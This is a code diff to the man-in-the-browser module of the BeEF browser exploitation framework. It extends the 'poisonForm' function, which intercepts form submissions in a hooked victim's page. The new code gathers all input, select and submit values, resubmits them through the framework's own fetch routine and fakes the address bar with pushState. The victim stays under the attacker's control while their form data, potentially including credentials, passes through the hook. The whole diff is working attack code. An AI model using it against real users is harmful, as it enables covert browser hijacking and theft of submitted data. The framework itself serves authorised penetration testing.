@@ -114,18 +114,39 @@ beef.mitb = {
     // Hooks forms and prevents them from linking away
     poisonForm:function (form) {
         form.onsubmit = function (e) {
+
+            // Collect <input> tags.
             var inputs = form.getElementsByTagName("input");
             var query = "";
             for (var i = 0; i < inputs.length; i++) {
-                if (i > 0 && i < inputs.length - 1) query += "&";
                 switch (inputs[i].type) {
                     case "submit":
                         break;
                     default:
-                        query += inputs[i].name + "=" + inputs[i].value;
+                        query += inputs[i].name + "=" + inputs[i].value + '&';
                         break;
                 }
             }
+
+            // Collect selected options from the form.
+            var selects = form.getElementsByTagName("select");
+            for (var i = 0; i < selects.length; i++) {
+                var select = selects[i];
+                query += select.name + "=" + select.options[select.selectedIndex].value + '&';
+            }
+
+            // We should be gathering 'submit' inputs as well, as there are 
+            // applications demanding this parameter.
+            var submit = $j('*[type="submit"]', form);
+            if(submit.length) {
+                // Append name of the submit button/input.
+                query += submit.attr('name') + '=' + submit.attr('value');
+            }
+
+            if(query.slice(-1) == '&') {
+                query = query.slice(0, -1);
+            }
+
             e.preventdefault;
             beef.mitb.fetchForm(form.action, query, document.getElementsByTagName("html")[0]);
             history.pushState({ Be:"EF" }, "", form.action);
